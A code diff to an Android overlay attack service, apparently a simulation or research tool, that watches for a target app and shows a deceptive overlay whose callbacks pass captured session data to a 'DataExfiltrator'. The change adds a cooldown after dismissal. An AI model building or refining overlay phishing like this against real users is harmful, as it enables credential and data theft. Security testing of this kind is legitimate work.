@@ -39,14 +39,18 @@ class OverlayService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private var isPolling = false
 
+    /** Timestamp of last overlay dismiss — used to prevent immediate re-trigger. */
+    private var lastDismissTime = 0L
+
     /** The polling runnable that checks the foreground app periodically. */
     private val pollRunnable = object : Runnable {
         override fun run() {
             if (!isPolling) return
 
             val foregroundPackage = foregroundDetector.getCurrentForegroundPackage()
+            val cooldownElapsed = System.currentTimeMillis() - lastDismissTime > COOLDOWN_MS
 
-            if (foregroundPackage == TARGET_PACKAGE && !overlayManager.isShowing) {
+            if (foregroundPackage == TARGET_PACKAGE && !overlayManager.isShowing && cooldownElapsed) {
                 Log.d(TAG, "Target app detected: $foregroundPackage — triggering overlay")
                 triggerOverlay()
             } else if (foregroundPackage != TARGET_PACKAGE && overlayManager.isShowing) {
@@ -126,7 +130,10 @@ class OverlayService : Service() {
                         // Simulate data exfiltration
                         DataExfiltrator.exfiltrate(session)
                     },
-                    onDismiss = { overlayManager.hide() }
+                    onDismiss = {
+                        overlayManager.hide()
+                        lastDismissTime = System.currentTimeMillis()
+                    }
                 )
             }
 
@@ -142,7 +149,10 @@ class OverlayService : Service() {
                         )
                         DataExfiltrator.exfiltrate(session)
                     },
-                    onDismiss = { overlayManager.hide() }
+                    onDismiss = {
+                        overlayManager.hide()
+                        lastDismissTime = System.currentTimeMillis()
+                    }
                 )
             }
 
@@ -167,6 +177,9 @@ class OverlayService : Service() {
 
         /** Delay before showing the overlay after detection (milliseconds). */
         private const val OVERLAY_DELAY_MS = 400L
+
+        /** Cooldown after dismiss before overlay can re-trigger (milliseconds). */
+        private const val COOLDOWN_MS = 10_000L
 
         /** Intent extra key for attack mode. */
         const val EXTRA_MODE = "attack_mode"
